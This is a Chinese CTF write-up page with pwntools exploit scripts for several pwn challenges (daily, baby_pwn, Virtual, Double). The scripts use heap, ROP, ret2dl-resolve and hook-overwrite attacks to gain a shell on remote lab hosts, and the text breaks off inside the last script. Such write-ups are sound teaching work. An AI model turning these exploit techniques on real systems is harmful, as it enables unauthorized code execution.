<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pop_rdi_ret = <span class="number">0xd03</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0xd01</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwn&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com&quot;</span>,<span class="string">&quot;57856&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;cws&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">p</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    ll = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        r.recvuntil(<span class="string">&quot;index\n&quot;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(i + p))</span><br><span class="line">        data = r.recvuntil(<span class="string">&quot;value\n&quot;</span>)[:-<span class="number">17</span>]</span><br><span class="line">        data = <span class="built_in">int</span>(data[-<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(i &lt; <span class="number">8</span>):</span><br><span class="line">            ll += data * (<span class="number">0x100</span> ** i)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">41</span> == <span class="number">0</span>):</span><br><span class="line">            r.recvuntil(<span class="string">&quot;continue(yes/no)? \n&quot;</span>)</span><br><span class="line">            r.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> ll</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">p, x</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        r.recvuntil(<span class="string">&quot;index\n&quot;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(i + p))</span><br><span class="line">        r.recvuntil(<span class="string">&quot;value\n&quot;</span>)</span><br><span class="line">        data = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span>(i != <span class="number">40</span>):</span><br><span class="line">            data = (x[i/<span class="number">8</span>] / (<span class="number">0x100</span> ** (i % <span class="number">8</span>))) % <span class="number">0x100</span></span><br><span class="line">        r.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">41</span> == <span class="number">0</span>):</span><br><span class="line">            r.recvuntil(<span class="string">&quot;continue(yes/no)? \n&quot;</span>)</span><br><span class="line">            r.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ret = get(0x150) - 0x118</span></span><br><span class="line"><span class="comment">#print &quot;ret: &quot; + hex(ret)</span></span><br><span class="line">pie = get(<span class="number">0x158</span>) - <span class="number">0xb11</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;pie: &quot;</span> + <span class="built_in">hex</span>(pie)</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x158</span>, [pie + pop_rdi_ret, pie + <span class="number">0x202020</span>, pie + <span class="number">0x8B0</span>, pie + <span class="number">0xb0c</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">libc = u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>)) - <span class="number">0x06f690</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc)</span><br><span class="line"></span><br><span class="line">system = libc + <span class="number">0x045390</span></span><br><span class="line">binsh = libc + <span class="number">0x18cd57</span></span><br><span class="line"></span><br><span class="line">write(<span class="number">0x158</span>, [pie + pop_rdi_ret, binsh, system, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="daily"><a href="#daily" class="headerlink" title="daily"></a>daily</h2><p><code>remove</code>的时候没有对<code>index</code>进行范围检测.</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5am3uuj20a3062aa1.jpg"></p>
<p>先利用<code>unsorted bin</code>泄露<code>libc</code>,再利用<code>fastbin</code>单链表泄露<code>heap</code>基址.</p>
<p>申请一个<code>chunk</code>,在里面伪造一个堆指针和对应的<code>faker chunk</code>.<br><code>free</code>掉这个<code>faker chunk</code>,通过<code>edit</code>构造其<code>fd</code>到<code>bss</code>上,由于<code>length</code>可控,通过<code>remove</code>构造出一个<code>chunk</code>头部绕过检查.<br>成功<code>fastbin attack</code>,获得任意读写的能力,由于程序开了<code>Full RELRO</code>所以劫持<code>__free_hook</code>调用<code>system(binsh);</code>获得<code>flag</code>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwn&quot;)</span></span><br><span class="line">ptr = <span class="number">0x602060</span></span><br><span class="line">r = remote(<span class="string">&quot;85c3e0fcae5e972af313488de60e8a5a.kr-lab.com&quot;</span>, <span class="string">&quot;58512&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    data = r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">length, content</span>):</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;of daily:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;daily\n&quot;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;of daily:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;daily\n&quot;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;of daily:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&#x27;b&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&#x27;c&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&#x27;d&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">heap = u64(r.recvuntil(<span class="string">&quot;1 :&quot;</span>)[:-<span class="number">3</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>)) - <span class="number">0x220</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">libc = u64(r.recvuntil(<span class="string">&quot;3 :&quot;</span>)[:-<span class="number">3</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap: &quot;</span> + <span class="built_in">hex</span>(heap)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc: &quot;</span> + <span class="built_in">hex</span>(libc)</span><br><span class="line"></span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, p64(heap + <span class="number">0x30</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>))<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">remove((heap + <span class="number">0x18</span> - ptr - <span class="number">8</span>) / <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x51</span>) + p64(ptr + <span class="number">0x18</span>))</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>, p64(ptr))</span><br><span class="line">edit(<span class="number">2</span>, p64(<span class="number">0x100</span>) + p64(ptr) + p64(<span class="number">0</span>) * <span class="number">4</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x100</span>) + p64(ptr) + p64(<span class="number">0x100</span>) + p64(libc + <span class="number">0x3c67a8</span>) + p64(<span class="number">0x100</span>) + p64(libc + <span class="number">0x18cd57</span>))</span><br><span class="line">edit(<span class="number">1</span>, p64(libc + 	<span class="number">0x045390</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot;of daily:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="baby-pwn"><a href="#baby-pwn" class="headerlink" title="baby_pwn"></a>baby_pwn</h2><p><code>ret2dl in x86</code>,没有可供<code>leak</code>的函数.保护很少,想起之前的<code>0ctf2018 babystack</code>,修改脚本直接打,成功.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> roputils</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwn&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;c346dfd9093dd09cc714320ffb41ab76.kr-lab.com&quot;</span>, <span class="string">&quot;56833&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop = roputils.ROP(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">addr_bss = rop.section(<span class="string">&#x27;.bss&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf1 = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x2c</span></span><br><span class="line">buf1 += p32(<span class="number">0x8048390</span>) + p32(<span class="number">0x804852D</span>) + p32(<span class="number">0</span>) + p32(addr_bss) + p32(<span class="number">100</span>)</span><br><span class="line">r.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">20</span>, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">100</span>, buf2)</span><br><span class="line">r.send(buf2)</span><br><span class="line"></span><br><span class="line">buf3 = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x2c</span> + rop.dl_resolve_call(addr_bss + <span class="number">20</span>, addr_bss)</span><br><span class="line">r.send(buf3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Virtual"><a href="#Virtual" class="headerlink" title="Virtual"></a>Virtual</h2><p>感觉难度主要在于逆向,理解程序逻辑.</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5helmoj208d0b3aa8.jpg"></p>
<p>首先是<code>store_instruction</code>函数将输入通过分隔符分类为各种操作符并保存在堆中,<code>store_num</code>同理.<br>其中三个堆块一个数据堆,一个操作符堆,一个栈(也是用来存数据的,存储操作符操作的数据).</p>
<p>重点就是<code>op</code>函数.</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g2ap5oqogij20ea055jrc.jpg"></p>
<p>这里不断从操作符堆取出操作符(对应的数字),然后跳转到函数执行的地方,这里<code>IDA</code>反汇编有问题,没有识别出函数调用,实际上<code>i</code>会被赋值为函数调用的返回值.</p>
<p>这些函数操作栈中的数据并将结果放回栈中,所以使用数据前需要先<code>push</code>.</p>
<p>关键函数是<code>load</code>和<code>save</code>,知道偏移就可以任意读写.<br>先使用<code>load</code>泄露堆上的堆地址,由于没开<code>pie</code>,通过<code>-</code>和<code>/</code>求出<code>.got[puts]</code>和此处偏移,再次<code>load</code>泄露<code>libc</code>,处理与<code>system</code>的偏移获得<code>system</code>地址.<br>不过这里没办法复制保存数据,只能移动和计算,所以之前的偏移没了,通过同样操作调整一下再次获得<code>.got[puts]</code>偏移,调用<code>save</code>成功劫持<code>puts@plt</code>.<br>突然发现<code>username</code>作用,开始试了<code>/bin/sh</code>,<code>ls</code>,<code>cat flag</code>什么的都是<code>comment not found</code>,最后<code>/bin/bash</code>成功.(话说这是故意的还是什么鬼)</p>
<p><code>payload</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwn&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;a569f7135ca8ce99c68ccedd6f3a83fd.kr-lab.com&quot;</span>, <span class="string">&quot;40003&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Your program name:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Your instruction:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;push push push load push sub div sub load push add&quot;</span></span><br><span class="line">payload += <span class="string">&quot; push push push load push sub div sub save&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;push push push load push sub div sub load pop&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Your stack data:\n&quot;</span>)</span><br><span class="line"><span class="comment">#payload = &quot;-1 8 -5 4210720&quot;</span></span><br><span class="line">payload = <span class="string">&quot;-1 8 -5 4210720 -172800 -1 8 -6 4210720&quot;</span></span><br><span class="line"><span class="comment">#0x404020 = 4210720,offset = -172800,one_gadget = -173178</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print r.recv()</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Double"><a href="#Double" class="headerlink" title="Double"></a>Double</h2><p>新增node时 ，会出现重用指针的情况， 导致后面的 uaf</p>
<p><img src="https://i.loli.net/2019/04/21/5cbbfe4598cd4.png"></p>
<p>然后 fastbin 改 malloc_hook</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;/home/hac425/vm_data/pwn/gs/Double/pwn&quot;</span></span><br><span class="line">aslr = <span class="literal">True</span></span><br><span class="line">context.log_level = <span class="literal">True</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=aslr)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com&quot;</span>, <span class="number">40002</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Your data:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="string">&quot;0&quot;</span> * (<span class="number">0x80</span> - <span class="number">1</span>) + <span class="string">&quot;\n&quot;</span>)  <span class="comment"># 0</span></span><br><span class="line">new(<span class="string">&quot;1&quot;</span> * (<span class="number">0x90</span> - <span class="number">1</span>) + <span class="string">&quot;\n&quot;</span>)  <span class="comment"># 1</span></span><br><span class="line">new(<span class="string">&quot;1&quot;</span> * (<span class="number">0x90</span> - <span class="number">1</span>) + <span class="string">&quot;\n&quot;</span>)  <span class="comment"># 2</span></span><br><span class="line">new(<span class="string">&quot;2&quot;</span> * (<span class="number">0x80</span> - <span class="number">1</span>) + <span class="string">&quot;\n&quot;</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>) + <span class="string">&quot;\x00&quot;</span> * <span class="number">2</span>) - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x68</span></span><br><span class="line">onegadget = libc.address + <span class="number">0xf1147</span></span><br><span class="line">info(<span class="string">&quot;libc: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">new(<span class="string">&quot;4&quot;</span> * (<span class="number">0x60</span> - <span class="number">1</span>) + <span class="string">&quot;\n&quot;</span>)  <span class="comment"># 4 , 2 ---&gt; 4</span></span><br><span class="line">new(<span class="string">&quot;5&quot;</span> * (<span class="number">0x60</span> - <span class="number">1</span>) + <span class="string">&quot;\n&quot;</span>)  <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(libc.symbols[<span 